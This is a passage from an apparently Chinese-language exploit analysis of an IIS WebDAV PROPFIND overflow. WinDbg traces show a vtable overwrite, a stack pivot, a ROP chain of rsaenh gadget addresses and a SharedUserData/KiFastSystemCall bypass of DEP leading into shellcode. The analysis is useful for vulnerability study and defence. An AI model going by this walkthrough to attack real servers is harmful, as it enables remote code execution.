<span class="mi">00</span><span class="n">fffc3c</span> <span class="mi">6711</span><span class="n">f68e</span> <span class="mi">0060</span><span class="n">b508</span> <span class="mi">0060584</span><span class="n">e</span> <span class="mi">80000000</span> <span class="mh">0x664d4150</span>
<span class="mi">00</span><span class="n">fffc78</span> <span class="mi">6711</span><span class="n">f7c5</span> <span class="mi">0060</span><span class="n">c010</span> <span class="mi">00</span><span class="n">fffcd4</span> <span class="mi">671404</span><span class="n">e2</span> <span class="n">httpext</span><span class="o">!</span><span class="n">CPropFindRequest</span><span class="o">::</span><span class="n">Execute</span><span class="o">+</span><span class="mh">0x125</span>
</pre></div>


<p>这时候对应的IEcb已经被覆盖，这样，在进入ScStoragePathFromUrl函数之后，会进入我们在漏洞分析部分提到的CheckPrefixUrl函数，这个函数中有大量的IEcb虚表虚函数引用。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">671335</span><span class="n">f3</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">httpext</span><span class="o">!</span><span class="n">ScStripAndCheckHttpPrefix</span><span class="o">+</span><span class="mh">0x1e</span><span class="o">:</span>
<span class="mi">671335</span><span class="n">f3</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">24</span><span class="n">h</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">680313</span><span class="n">e4</span><span class="o">=</span><span class="mi">68016082</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="n">eax</span>
<span class="mi">680313</span><span class="n">c0</span>  <span class="mi">680313</span><span class="n">c0</span> <span class="mi">68006</span><span class="n">e4f</span> <span class="mi">68006</span><span class="n">e4f</span> <span class="mi">766</span><span class="n">a4247</span>  <span class="o">...</span><span class="n">hOn</span><span class="o">.</span><span class="na">hOn</span><span class="o">.</span><span class="na">hGBjv</span>
<span class="mi">680313</span><span class="n">d0</span>  <span class="mi">680313</span><span class="n">c0</span> <span class="mi">4</span><span class="n">f744257</span> <span class="mi">52345947</span> <span class="mi">4</span><span class="n">b424b66</span>  <span class="o">...</span><span class="n">hWBtOGY4RfKBK</span>
</pre></div>


<p>和大家分享了这个精妙利用，一般可能都会觉得是第二次url bbbbb的这个memcpy覆盖了关键函数导致的溢出、利用，实际上，在第一次url aaaaaa中，就已经引发了栈溢出，覆盖到了stackbuffer申请的指向栈buffer的指针，这个指针存放在栈里，用于后续调用存放虚拟路径，由于第一次栈溢出，覆盖到了这个变量导致第二次url bbbbb拷贝的时候，是向一个堆地址拷贝，这个堆地址后面的偏移中，存放着IEcb的vftable，通过覆盖虚表虚函数，在最后locktoken触发的ScStoragePathFromUrl中利用虚函数达到代码执行。</p>
<p>而这个过程，也是巧妙的绕过了GS的检查。</p>
<hr />
<h3>简析ROP及shellcode</h3>
<hr />
<p>这个漏洞使用了一些非常有意思的手法，一个是TK教主在13年安全会议上提到的shareduserdata，在ROP中，另一个是alpha shellcode。</p>
<p>首先，在前面虚函数执行之后，会先进行stack pivot，随后进入rop。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">t</span><span class="c1">//stack pivot!!!</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68016082</span> <span class="n">esp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4b0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x42</span><span class="o">:</span>
<span class="mi">68016082</span> <span class="mi">8</span><span class="n">be1</span>            <span class="n">mov</span>     <span class="n">esp</span><span class="o">,</span><span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68016084</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x44</span><span class="o">:</span>
<span class="mi">68016084</span> <span class="mi">8</span><span class="n">b08</span>            <span class="n">mov</span>     <span class="n">ecx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">680313</span><span class="n">c0</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68016086</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x46</span><span class="o">:</span>
<span class="mi">68016086</span> <span class="mi">8</span><span class="n">b4004</span>          <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">+</span><span class="mi">4</span><span class="o">]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">680313</span><span class="n">c4</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68016089</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x49</span><span class="o">:</span>
<span class="mi">68016089</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//ROP Chain</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">6801608</span><span class="n">a</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">_alloca_probe</span><span class="o">+</span><span class="mh">0x4a</span><span class="o">:</span>
<span class="mi">6801608</span><span class="n">a</span> <span class="n">c3</span>              <span class="n">ret</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0060</span><span class="n">e7b0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">CPEncrypt</span><span class="o">+</span><span class="mh">0x3b</span><span class="o">:</span>
<span class="mi">68006</span><span class="n">e4f</span> <span class="mi">5</span><span class="n">e</span>              <span class="n">pop</span>     <span class="n">esi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68006</span><span class="n">e50</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4d0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">CPEncrypt</span><span class="o">+</span><span class="mh">0x3c</span><span class="o">:</span>
<span class="mi">68006</span><span class="n">e50</span> <span class="mi">5</span><span class="n">d</span>              <span class="n">pop</span>     <span class="n">ebp</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68006</span><span class="n">e51</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">c8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">CPEncrypt</span><span class="o">+</span><span class="mh">0x3d</span><span class="o">:</span>
<span class="mi">68006</span><span class="n">e51</span> <span class="n">c22000</span>          <span class="n">ret</span>     <span class="mi">20</span><span class="n">h</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00</span><span class="n">fffbe8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">esp</span><span class="o">=</span><span class="mi">680313</span><span class="n">ec</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">68006</span><span class="n">e4f</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">CPEncrypt</span><span class="o">+</span><span class="mh">0x3b</span><span class="o">:</span>
<span class="mi">68006</span><span class="n">e4f</span> <span class="mi">5</span><span class="n">e</span>              <span class="n">pop</span>     <span class="n">esi</span>
</pre></div>


<p>经过一系列ROP之后，会进入KiFastSystemCall，这是利用SharedUserData bypass DEP的一环。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0000008</span><span class="n">f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">HmacCheck</span><span class="o">+</span><span class="mh">0x2c3</span><span class="o">:</span>
<span class="mi">680124</span><span class="n">e3</span> <span class="n">ff23</span>            <span class="n">jmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebx</span><span class="o">]</span>      <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">7</span><span class="n">ffe0300</span><span class="o">={</span><span class="n">ntdll</span><span class="o">!</span><span class="n">KiFastSystemCall</span> <span class="o">(</span><span class="mi">7</span><span class="n">c8285e8</span><span class="o">)}</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0000008</span><span class="n">f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00</span><span class="n">fff4f8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7</span><span class="n">c8285e8</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">ntdll</span><span class="o">!</span><span class="n">KiFastSystemCall</span><span class="o">:</span>
<span class="mi">7</span><span class="n">c8285e8</span> <span class="mi">8</span><span class="n">bd4</span>            <span class="n">mov</span>     <span class="n">edx</span><span class="o">,</span><span class="n">esp</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0000008</span><span class="n">f</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">680313</span><span class="n">c0</span> <span class="n">edx</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7</span><span class="n">c8285ea</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031400</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">ntdll</span><span class="o">!</span><span class="n">KiFastSystemCall</span><span class="o">+</span><span class="mh">0x2</span><span class="o">:</span>
<span class="mi">7</span><span class="n">c8285ea</span> <span class="mi">0</span><span class="n">f34</span>            <span class="n">sysenter</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">7</span><span class="n">ffe0300</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edx</span><span class="o">=</span><span class="n">ffffffff</span> <span class="n">esi</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">edi</span><span class="o">=</span><span class="mi">680124</span><span class="n">e3</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">68031460</span> <span class="n">esp</span><span class="o">=</span><span class="mi">68031404</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">6</span><span class="n">e6f3176</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">rsaenh</span><span class="o">!</span><span class="n">g_pfnFree</span><span class="o">+</span><span class="mh">0x1a4</span><span class="o">:</span>
<span class="mi">68031460</span> <span class="mi">56</span>              <span class="n">push</span>    <span class="n">esi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">009</span><span class="o">&gt;</span> <span class="n">dc</span> <span class="mi">68031460</span>
